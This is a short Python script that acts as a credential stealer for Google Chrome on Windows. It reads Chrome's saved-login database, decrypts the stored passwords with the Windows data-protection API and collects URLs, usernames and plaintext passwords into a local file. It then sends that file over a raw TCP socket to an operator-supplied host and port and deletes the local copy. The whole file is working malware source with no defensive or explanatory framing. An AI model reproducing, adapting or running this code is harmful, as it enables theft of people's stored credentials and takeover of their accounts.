import os
import sqlite3
import win32crypt
import socket


host = 'ENTER HOSTNAME OR IP HERE'
port = 9090
connected = False

dbChrome = sqlite3
dbSend = sqlite3

try:
    dbChrome = sqlite3.connect(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data")

    try:
        dbSend = sqlite3.connect("logdata.db")
    except sqlite3.Error as e:
        print("Error: ", e)

    clientsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        clientsock.connect((host, port))
        connected = True
    except socket.error as e:
        print("Error: Can't connect to server -- ", e)

    cursorChrome = dbChrome.cursor()
    cursorSend = dbSend.cursor()

    try:
        cursorChrome.execute('SELECT action_url, username_value, password_value FROM logins')
        cursorSend.execute('CREATE TABLE IF NOT EXISTS passwords(url UNIQUE, username, password)')
    except sqlite3.DatabaseError as e:
        print("Error: ", e)

    for result in cursorChrome.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        url = result[0]
        username = result[1]

        if password:
            cursorSend.execute('INSERT OR IGNORE INTO passwords (url, username, password) VALUES (?, ?, ?)',
                               (url, username, password))

    # Commiting changes to Database
    dbSend.commit()

    # Closing open connections to Databases
    dbChrome.close()
    dbSend.close()

    try:
        passfile = open("logdata.db", "rb")
        try:
            if connected: clientsock.sendall(passfile.read())
            passfile.close()
        except socket.error as e:
            print("ERROR: Can't send data -- ", e)

        try:
            if passfile.closed:
                os.remove("logdata.db")
            print("Successfully deleted passfile")
        except IOError as e:
            print("Error: Cannot delete passfile -- ", e)

    except IOError as e:
        print("Error: Can't open/create file -- ", e)

    dbChrome.close()
    dbSend.close()

    try:
        clientsock.shutdown(socket.SHUT_WR)
    except socket.error as e: # Socket shutdown exception
        print("Error: ", e)
except sqlite3.Error as e: # Socket connection exception
    print("Error: ", e)

